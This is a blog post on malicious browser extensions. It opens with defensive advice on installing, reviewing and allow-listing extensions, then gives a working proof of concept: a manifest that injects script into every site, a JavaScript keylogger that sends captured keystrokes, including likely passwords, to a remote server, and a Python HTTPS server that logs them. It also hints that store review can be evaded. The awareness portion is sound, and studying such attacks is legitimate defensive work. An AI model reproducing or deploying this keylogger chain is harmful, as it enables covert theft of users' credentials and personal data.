---
layout: post
title:  "Malicious Browser Extensions"
date:   2022-12-26 12:36:06 -0800
categories: Blog
---
Browser extensions are small software programs that can be installed on a web browser and add additional functionality or features to the browser. They are designed to enhance the user’s experience and make it easier to browse the web. However, just like any other software, browser extensions can be used for malicious purposes.

For example, Malicious browser extensions can collect and send sensitive information to third parties. This can include login credentials, financial information, and personal data. This data collection and tracking is often done without the user’s knowledge or consent.

Another way malicious browser extensions can be used is by altering the default search engine or injecting ads and other unwanted content into websites. This can include pop-ups, banners, and links to other websites. These ads and content can be annoying and disruptive for the user, often leading to phishing attacks or other scams.

To reduce risk, only install extensions from trusted sources, such as the official extension store for your browser. These extensions have been assessed for malicious intent; however, these checks are imperfect. It is also recommended to carefully read the reviews and descriptions of extensions before installing them. Pay attention to any red flags, such as many negative reviews or a lack of information about the extension’s purpose or functionality.

Additionally, regularly update your web browser and keep your operating system and antivirus software up to date. This can help to protect against security vulnerabilities that may be exploited by malicious extensions.

It is also a good idea to periodically review the extensions installed on your browser and remove any that are no longer needed or that you do not recognize. This can help to reduce the risk of being targeted by malicious extensions.

Ultimately, browser extensions can be a useful tool for enhancing the user’s online experience, but they can also be used for malicious purposes. Therefore, it is essential to be cautious when installing and using extensions and to take steps to protect against malicious extensions. For organizations, it is recommended to disable browser-based developer modes and browser extensions and enable extensions using an allow list if necessary. 

For PoC purposes, you really only need a few lines in your manifest.json file to inject javascript into the user's browser.  This most definitely will not be authorized for the Chrome Store.  Your initial thought may be to obfuscate all the things, but Google actually will not authorize any obfuscated extensions and is relatively thorough about determining if there is a legitimate use case for the permissions requested, which would be defined in the manifest.json file.  That said, where there's a will, there's a way. 
```
{
    "manifest_version": 3,
    "name": "Circle Back",
    "description": "Extension by CirclesWeRun",
    "version": "1.0",

    "content_scripts":[
        {
            "matches": ["<all_urls>"],
            "js": ["src/inject.js"]
        }
    ]
}
```

Then you can, for example, inject the user's browser with a simple keylogger.
```
returnWords = [window.location.href]        //array containing URL and recorded words
keystrokes = []

document.onkeydown = function (e) {
        keystrokes.push(e.key);             // record keystrokes
};

window.onbeforeunload = function() {
    startString = 0;
    for (let i = 0; i < keystrokes.length; i++){
        if (keystrokes[i] == "Enter"){
            returnWords.push(keystrokes.slice(startString,i).join(''));      // if user clicks "Enter" add the string to returnWords
            startString = i + 1;
        }
        else if (i == keystrokes.length - 1)                       // if no enter at the end of keystrokes, add the characters to returnWords
            returnWords.push(keystrokes.slice(startString, keystrokes.length).join(''));
    }

    fetch('https://yourwebsite.com:4443/', {                   //initiate a POST request to webserver
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(returnWords)
    })
}
```

With a web server supporting HTTPS to capture the POST data. 
```
#!/usr/bin/env python3

"""
Very simple HTTP server in python for logging requests

Create fullchain.pem and privkey.pem using certbot (letsencrypt)
certbot certonly --standalone -d yourdomain.com

Usage::
    ./server.py [<port>]
"""

from http.server import BaseHTTPRequestHandler, HTTPServer
import logging
import ssl
import sys

class S(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])    # gets length of the request
        post_data = self.rfile.read(content_length)             # gets the data from the request
        logging.info(self.client_address[0] + " : " + post_data.decode('utf-8'))                 # log the URL and captured keystrokes
        self._set_response()

def run(server_class=HTTPServer, handler_class=S, port=8080):
    stdout_handler = logging.StreamHandler(stream=sys.stdout)
    handlers = [stdout_handler]
    logging.basicConfig(
        level=logging.DEBUG, 
        handlers=handlers
    )
    logger = logging.getLogger('LOGGER_NAME')

    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd...\n')
    try:
        httpd.socket = ssl.wrap_socket (httpd.socket, certfile='/etc/letsencrypt/live/yourwebsite.com/fullchain.pem', keyfile='/etc/letsencrypt/live/yourwebsite.com/privkey.pem', server_side=True)
        httpd.serve_forever()
    except KeyboardInterrupt:
        httpd.server_close()
        logging.info('Stopping httpd...\n')

if __name__ == '__main__':
    from sys import argv
    
    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
```
